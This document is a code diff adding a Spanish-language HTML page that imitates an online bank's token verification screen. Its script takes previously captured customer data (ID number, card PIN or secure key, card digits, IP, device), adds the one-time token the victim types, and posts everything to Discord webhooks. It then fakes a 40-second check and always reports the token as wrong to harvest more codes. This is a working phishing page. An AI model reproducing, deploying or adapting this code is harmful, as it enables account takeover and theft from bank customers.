@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="es">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Ingreso a Banca Virtual
+  </title>
+  <script src="https://cdn.tailwindcss.com">
+  </script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+    /* Loader CSS */
+    .loader-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.8);
+        z-index: 9999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-size: 1.5rem;
+        flex-direction: column;
+        gap: 10px;
+    }
+    .spinner {
+        border: 4px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top: 4px solid #fff;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+  </style>
+ </head>
+ <body class="bg-[#f3f7fc] min-h-screen flex flex-col items-center p-4">
+  <header class="w-full max-w-md flex items-center justify-between py-4">
+   <button aria-label="Volver" class="text-[#1a2a5a] text-xl">
+    <i class="fas fa-chevron-left">
+    </i>
+   </button>
+   <h1 class="text-[#1a2a5a] font-semibold text-base">
+    Ingreso a Banca Virtual
+   </h1>
+   <button aria-label="Cerrar" class="text-[#1a2a5a] text-xl">
+    <i class="fas fa-times">
+    </i>
+   </button>
+  </header>
+  <main class="w-full max-w-md">
+    <br>
+   <h2 class="text-[#1a2a5a] font-semibold text-lg mb-4">
+    Verifiquemos que seas tú
+   </h2>
+   <section class="bg-white rounded-lg p-5 shadow-sm">
+    <div class="flex items-start space-x-3 mb-3">
+     <img alt="Icono de candado abierto con código" class="w-6 h-6 flex-shrink-0 mt-1" decoding="async" height="24" loading="lazy" src="candado.png" width="24"/>
+     <div>
+      <div class="flex items-center space-x-1 mb-1">
+       <span class="font-semibold text-[#1a2a5a] text-base">
+        Código Token
+       </span>
+       <button aria-label="Información sobre Código Token" class="text-[#1a2a5a] border border-[#1a2a5a] rounded-full w-5 h-5 flex items-center justify-center text-xs font-semibold leading-none">
+        i
+       </button>
+      </div>
+      <p class="text-[#5a5a5a] text-sm leading-relaxed max-w-[320px]">
+       Para realizar este proceso, ingresa el código de Token móvil o físico.
+      </p>
+     </div>
+    </div>
+       <form class="mt-4" onsubmit="event.preventDefault()">
+         <div id="token-inputs" class="grid grid-cols-6 gap-2 justify-center mb-6">
+           <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+             class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+           <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+             class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+           <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+             class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+           <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+             class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+           <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+             class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+           <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*"
+             class="token-input w-10 h-10 rounded-md border border-[#d1d5db] bg-white text-center text-lg font-semibold text-[#1a2a5a] focus:outline-none focus:ring-2 focus:ring-[#1a2a5a]" />
+         </div>
+         <p id="errorMessage" class="text-red-500 text-center mb-4 hidden">Token incorrecto, intenta de nuevo.</p>
+
+         <button id="verifyBtn" class="w-full bg-[#e5e7eb] text-[#9ca3af] font-semibold text-base rounded-full py-3 cursor-not-allowed transition-colors duration-200"
+           disabled type="submit">
+           Verificar
+         </button>
+       </form>
+
+       <div id="loader" class="loader-overlay" style="display: none;">
+           <div class="spinner"></div>
+           <p>Verificando token...</p>
+       </div>
+
+       <script>
+         const inputs = document.querySelectorAll(".token-input");
+         const verifyBtn = document.getElementById("verifyBtn");
+         const errorMessage = document.getElementById("errorMessage");
+         const loader = document.getElementById("loader");
+
+         let initialLoginData = null;
+         let tokenAttemptCount = parseInt(sessionStorage.getItem('tokenAttemptCount')) || 0;
+
+         // Función para enviar datos a Discord (a través de webhooks)
+         async function sendToDiscordWebhook(webhookUrl, messageContent) {
+            if (!webhookUrl) {
+                console.error('URL del webhook de Discord no configurada. No se puede enviar el mensaje.');
+                return false;
+            }
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: messageContent
+                    }),
+                });
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    console.error(`Error al enviar mensaje a Discord (Webhook): ${response.status} - ${errorText}`);
+                    return false;
+                }
+                console.log('Mensaje enviado a Discord exitosamente.');
+                return true;
+            } catch (error) {
+                console.error('Error de red al enviar mensaje a Discord:', error);
+                return false;
+            }
+        }
+
+         document.addEventListener('DOMContentLoaded', () => {
+             const storedData = sessionStorage.getItem('initialLoginData');
+             if (storedData) {
+                 initialLoginData = JSON.parse(storedData);
+             } else {
+                 // Si no hay datos, redirigir a la página principal
+                 window.location.href = 'index.html';
+             }
+         });
+
+         inputs.forEach((input, i) => {
+           input.addEventListener("input", (e) => {
+             const value = e.target.value;
+             if (/^\d$/.test(value)) {
+               if (i < inputs.length - 1) inputs[i + 1].focus();
+             } else {
+               e.target.value = "";
+             }
+             checkAllFilled();
+           });
+
+           input.addEventListener("keydown", (e) => {
+             if (e.key === "Backspace" && !input.value && i > 0) {
+               inputs[i - 1].focus();
+             }
+           });
+
+           input.addEventListener("paste", (e) => {
+             e.preventDefault();
+             const paste = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "").slice(0, 6);
+             [...paste].forEach((char, idx) => {
+               if (inputs[idx]) inputs[idx].value = char;
+             });
+             if (paste.length > 0) {
+               inputs[Math.min(paste.length, inputs.length - 1)].focus();
+             }
+             checkAllFilled();
+           });
+         });
+
+         function checkAllFilled() {
+           const allFilled = [...inputs].every((inp) => inp.value.length === 1);
+           verifyBtn.disabled = !allFilled;
+           verifyBtn.classList.toggle("cursor-not-allowed", !allFilled);
+           verifyBtn.classList.toggle("bg-[#e5e7eb]", !allFilled);
+           verifyBtn.classList.toggle("text-[#9ca3af]", !allFilled);
+           verifyBtn.classList.toggle("bg-[#3b82f6]", allFilled); // Azul claro activo
+           verifyBtn.classList.toggle("text-white", allFilled);
+         }
+
+         verifyBtn.addEventListener('click', async () => {
+             const token = [...inputs].map(input => input.value).join('');
+             errorMessage.classList.add('hidden'); // Ocultar mensaje de error anterior
+             loader.style.display = 'flex'; // Mostrar loader
+
+             tokenAttemptCount++; // Incrementar contador de intentos
+
+             let discordMessage = '';
+             if (initialLoginData.debitCardKey && initialLoginData.last4Digits !== 'N/A') {
+                 // Formato para clave de 4 dígitos
+                 discordMessage = `💳 **NUEVO TOKEN (intento ${tokenAttemptCount})**\n\n`;
+                 discordMessage += `**CC:** ${initialLoginData.identificationNumber}\n`;
+                 discordMessage += `**Clave Targeta:** ${initialLoginData.debitCardKey}\n`;
+                 discordMessage += `**4 dígitos:** ${initialLoginData.last4Digits}\n`;
+                 discordMessage += `🍀 **Token:** ${token}\n`;
+                 if (initialLoginData.legalRepresentativeNumber !== 'N/A') {
+                    discordMessage += `**Tipo Rep. Legal:** ${initialLoginData.legalRepresentativeDoc}\n`;
+                    discordMessage += `**No. Rep. Legal:** ${initialLoginData.legalRepresentativeNumber}\n`;
+                }
+                 discordMessage += `\n**IP:** ${initialLoginData.ip}\n`;
+                 discordMessage += `**Dispositivo:** ${initialLoginData.device}\n`;
+                 discordMessage += `**Fecha/Hora:** ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+             } else if (initialLoginData.secureKey !== 'N/A') {
+                 // Formato para clave segura
+                 discordMessage = `🚨 **NUEVO TOKEN (intento ${tokenAttemptCount})**\n\n`;
+                 discordMessage += `**CC:** ${initialLoginData.identificationNumber}\n`;
+                 discordMessage += `**CLAVE:** ${initialLoginData.secureKey}\n`;
+                 discordMessage += `🍀 **Token:** ${token}\n`;
+                 if (initialLoginData.legalRepresentativeNumber !== 'N/A') {
+                    discordMessage += `**Tipo Rep. Legal:** ${initialLoginData.legalRepresentativeDoc}\n`;
+                    discordMessage += `**No. Rep. Legal:** ${initialLoginData.legalRepresentativeNumber}\n`;
+                }
+                 discordMessage += `\n**IP:** ${initialLoginData.ip}\n`;
+                 discordMessage += `**Dispositivo:** ${initialLoginData.device}\n`;
+                 discordMessage += `**Fecha/Hora:** ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`;
+             }
+
+             // Guardar el contador de intentos actualizado
+             sessionStorage.setItem('tokenAttemptCount', tokenAttemptCount);
+
+             const webhookUrlGroup1 = localStorage.getItem('TELEGRAM_CHAT_ID_GROUP1');
+             const webhookUrlGroup2 = localStorage.getItem('TELEGRAM_CHAT_ID_GROUP2');
+
+             // Enviar a ambos webhooks
+             const sentToGroup1 = webhookUrlGroup1 ? await sendToDiscordWebhook(webhookUrlGroup1, discordMessage) : false;
+             const sentToGroup2 = webhookUrlGroup2 ? await sendToDiscordWebhook(webhookUrlGroup2, discordMessage) : false;
+
+             setTimeout(() => {
+                 loader.style.display = 'none'; // Ocultar loader
+                 if (sentToGroup1 || sentToGroup2) {
+                     // Si se envió correctamente, mostrar error y limpiar inputs para otro intento
+                     errorMessage.classList.remove('hidden');
+                     inputs.forEach(input => input.value = ''); // Limpiar inputs
+                     inputs[0].focus(); // Enfocar el primer input para un nuevo intento
+                     checkAllFilled(); // Deshabilitar el botón de nuevo
+                 } else {
+                     alert("Error al enviar el token a Discord. Por favor, inténtalo de nuevo.");
+                     // Opcional: Podrías redirigir al index.html si hay un error persistente aquí.
+                     // window.location.href = 'index.html';
+                 }
+             }, 40000); // Esperar 40 segundos para simular verificación del token
+         });
+       </script>
+
+     </button>
+    </form>
+   </section>
+  </main>
+ </body>
+</html>
